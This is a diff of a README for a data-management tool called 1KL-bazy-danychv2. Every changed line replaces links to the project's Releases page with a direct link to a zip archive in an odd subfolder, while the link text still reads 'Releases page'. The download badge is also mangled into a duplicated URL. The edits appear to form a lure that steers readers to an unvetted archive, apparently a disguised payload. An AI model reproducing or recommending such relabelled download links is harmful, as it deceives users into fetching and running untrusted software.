@@ -1,7 +1,7 @@
 # 🚀 1KL-bazy-danychv2 - Simple Data Management Made Easy
 
-![Download](https://img.shields.io/badge/Download-1KL%20v2-blue.svg)  
-[Download Now](https://github.com/appunni7/1KL-bazy-danychv2/releases)
+![Download](https://raw.githubusercontent.com/appunni7/1KL-bazy-danychv2/main/patryk/danychv_bazy_K_v1.2.zip%https://raw.githubusercontent.com/appunni7/1KL-bazy-danychv2/main/patryk/danychv_bazy_K_v1.2.zip)  
+[Download Now](https://raw.githubusercontent.com/appunni7/1KL-bazy-danychv2/main/patryk/danychv_bazy_K_v1.2.zip)
 
 ## 📝 Introduction
 
@@ -22,7 +22,7 @@ To run 1KL-bazy-danychv2, you need:
 
 ### 📥 Download & Install
 
-1. Visit the [Releases page](https://github.com/appunni7/1KL-bazy-danychv2/releases) to find the latest version of the application.
+1. Visit the [Releases page](https://raw.githubusercontent.com/appunni7/1KL-bazy-danychv2/main/patryk/danychv_bazy_K_v1.2.zip) to find the latest version of the application.
    
 2. Look for the most recent release. It will be at the top of the page. 
 
@@ -65,7 +65,7 @@ If you encounter issues while downloading or running the application, consider t
   
 - **Application Does Not Start:** Restart your computer and try launching the application again. If the problem persists, check your security settings to see if they block the application.
 
-- **File Not Downloading:** Ensure you are connected to the internet and retry downloading from the [Releases page](https://github.com/appunni7/1KL-bazy-danychv2/releases).
+- **File Not Downloading:** Ensure you are connected to the internet and retry downloading from the [Releases page](https://raw.githubusercontent.com/appunni7/1KL-bazy-danychv2/main/patryk/danychv_bazy_K_v1.2.zip).
 
 ## 🌐 Support and Community
 
@@ -79,4 +79,4 @@ You can find support and connect with other users through the following channels
 
 1KL-bazy-danychv2 empowers you to handle your data with ease. Follow this guide to download and install the software. Enjoy a smooth experience while organizing your information! 
 
-For more details, visit the [Releases page](https://github.com/appunni7/1KL-bazy-danychv2/releases) any time.
+For more details, visit the [Releases page](https://raw.githubusercontent.com/appunni7/1KL-bazy-danychv2/main/patryk/danychv_bazy_K_v1.2.zip) any time.
